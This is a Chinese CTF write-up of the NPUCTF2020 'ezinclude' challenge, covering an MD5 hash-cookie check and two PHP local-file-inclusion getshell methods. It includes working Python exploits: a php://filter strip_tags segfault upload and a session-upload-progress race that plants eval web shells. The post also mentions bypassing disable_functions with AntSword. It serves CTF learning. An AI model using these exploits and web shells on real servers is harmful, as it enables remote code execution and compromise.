# [NPUCTF2020]ezinclude 文件包含两大 getshell方式

[PHP LFI 利用临时文件 Getshell 姿势 | 码农家园](https://www.codenong.com/cs106498971/) 

说一下我的思路吧

robots没有

扫描发现存在 dir.php

然后404.html 报错

apache2.18 ubuntu

这个又正好存在漏洞 所以前面全去看这个了

结果根本不是这样做。。。

正确的思路是这样



<img src="https://i-blog.csdnimg.cn/blog_migrate/9e35ecb4cab0fa40e6cd19815d2bb55e.png" alt="" style="max-height:183px; box-sizing:content-box;" />


发现变量 认为是 name和 pass传递参数

或者通过爆破 但是太慢了

我们可以抓包测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce8308e027bb650a4399291c3d568eb8.png" alt="" style="max-height:323px; box-sizing:content-box;" />


发现了 hash  因为提示我们MD5所以我们需要注意

然后我们传递一个 ?name=2



<img src="https://i-blog.csdnimg.cn/blog_migrate/3d600364e216d695090ee6816e45f673.png" alt="" style="max-height:356px; box-sizing:content-box;" />


发现hash变了 这里我们就多半能确定 cookie是我们的pass

因为 name改变 cookie也改变 然后都是hash值

所以我们pass=hash一下看看

```cobol
GET /?name=2&pass=616bcf60c47829c8e770b19fd45336d9 HTTP/1.
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d3eab1972cd04da4d619d4827539e399.png" alt="" style="max-height:383px; box-sizing:content-box;" />


我们去访问看看

这里全程只能 bp抓包

不然会跳转 404



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6232b4e8566c085f513d4e7276258a1.png" alt="" style="max-height:542px; box-sizing:content-box;" />


发现 include了 文件包含 我们去看看 用伪协议读取一下文件吧

首先是 404.html 一点用都没有。。。

我们看看 dir.php

```php
<?php
var_dump(scandir('/tmp'));
?>
```

我们看看index

```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

okok 做到这里 一点思路都没得了 只有 dir.php存在输出 多半是通过 dir.php输出内容 那我要怎么实现啊。。。。。

看wp吧

学到了学到了

 [PHP LFI 利用临时文件Getshell_双层小牛堡的博客-CSDN博客](https://blog.csdn.net/m0_64180167/article/details/133757009?spm=1001.2014.3001.5501) 

这里是我学习到的知识点

我们开始

## 1. php7 Segment Fault

我们首先抓包的时候可以可以发现

<img src="https://i-blog.csdnimg.cn/blog_migrate/e96ceb381735b76b34d9a19d8e7f162c.png" alt="" style="max-height:491px; box-sizing:content-box;" />


存在 php 7 这里存在一个漏洞

如果用 过滤器string.strip_args 的时候 选择一个文件

并且我们可以通过fuzz或者dir.php查找

exp

```cobol
#python 2.7
 
import requests
from io import BytesIO
 
url1 = "http://852f2c43-71c0-4238-bc32-a0ed26a77477.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=dir.php"
 
files = {'file': BytesIO('<?php eval($_REQUEST[1]);?>')}
 
re = requests.post(url=url1, files=files, allow_redirects=False)
 
url2 = "http://852f2c43-71c0-4238-bc32-a0ed26a77477.node4.buuoj.cn:81/dir.php"
 
re2 = requests.get(url=url2)
 
print
re2.text
```

但是很奇怪 我根本在web中无法实现 所以我用蚁剑链接



<img src="https://i-blog.csdnimg.cn/blog_migrate/0a7cefb81a88775f8bc1d075a0ae54f8.png" alt="" style="max-height:181px; box-sizing:content-box;" />


但是奇了怪了 无法执行命令 啥都没有 可能被disable_function 了

我们用插件bypass



<img src="https://i-blog.csdnimg.cn/blog_migrate/30df8aa89976d86c8eb894cffdaaa896.png" alt="" style="max-height:499px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/7137ccf92b551c65495efcca7bef5c5c.png" alt="" style="max-height:576px; box-sizing:content-box;" />


错的 看wp才知道是在phpinfo中

正好也有插件可以查看phpinfo



<img src="https://i-blog.csdnimg.cn/blog_migrate/699b3014db6b87a1de53385006b17842.png" alt="" style="max-height:597px; box-sizing:content-box;" />


获取flag

## 2.session get shell

这里不知道有没有开启session 但是文件包含题目 可以试试看

exp

```cobol
import io
import sys
import requests
import threading
 
sessid = 'shell'
 
 
def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            'http://852f2c43-71c0-4238-bc32-a0ed26a77477.node4.buuoj.cn:81/',
            data={
                "PHP_SESSION_UPLOAD_PROGRESS": "<?php phpinfo();fputs(fopen('shell.php','w'),'<?php @eval($_POST[mtfQ])?>');?>"},
            files={"file": ('q.txt', f)},
            cookies={'PHPSESSID': sessid}
        )
 
 
def READ(session):
    while True:
        response = session.get(
            f'http://852f2c43-71c0-4238-bc32-a0ed26a77477.node4.buuoj.cn:81/flflflflag.php?file=../../../../../../../../tmp/sess_{sessid}')
        # print('[+++]retry')
        # print(response.text)
 
        if 'flag' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)
 
 
with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session,))
    t1.daemon = True
    t1.start()
 
    READ(session)
```

一直跑就出来了 因为返回了phpinfo

里面存在flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/18289ec248c4c48825e8d7170cb1b48a.png" alt="" style="max-height:148px; box-sizing:content-box;" />